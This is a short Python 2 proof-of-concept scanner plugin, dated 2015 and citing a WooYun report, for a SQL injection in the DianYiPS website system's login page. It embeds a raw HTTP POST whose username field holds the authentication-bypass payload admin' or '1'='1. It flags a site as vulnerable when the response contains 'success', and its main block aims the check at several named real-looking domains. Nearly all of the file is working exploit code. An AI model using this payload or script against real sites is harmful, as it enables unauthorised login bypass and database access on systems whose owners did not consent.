# coding:utf-8
# title:DianYiPS建站系统sql注入漏洞
# author:codier
# blog:http://www.codier.cn
# date:2015-08-10
# from:http://www.wooyun.org/bugs/wooyun-2015-0110810

import re,urlparse

rawt = '''POST /dianyi/index.php?action=login HTTP/1.1
Host: gxpcjz.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0
Accept: text/javascript, text/html, application/xml, text/xml, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
X-Prototype-Version: 1.6.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 94
Cookie: tempConfig=default
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

name=admin'%20or%20'1'%3D'1&password=5646&submit=%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95&isAjax=1'''


def assign(service, arg):
    if service == "dianyips":
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme,arr.netloc)

def audit(arg):
    url = arg
    code, head, res, errcode, _ = curl.curl2(url + '/dianyi/index.php?action=login',raw = rawt)
    if code == 200:
        m = re.search('success', res)
        if m:
            security_info('[username: sql injection]'+ url + '/dianyi/index.php?action=login')

if __name__ == '__main__':
    from dummy import *
    audit(assign('dianyips', 'http://gxpcjz.com/')[1])
    #audit(assign('DianYiPS', 'http://www.fpg1919.com/')[1])
    #audit(assign('DianYiPS', 'http://ss-hearing.com/')[1])
    audit(assign('dianyips', 'http://gxymzs.com/')[1])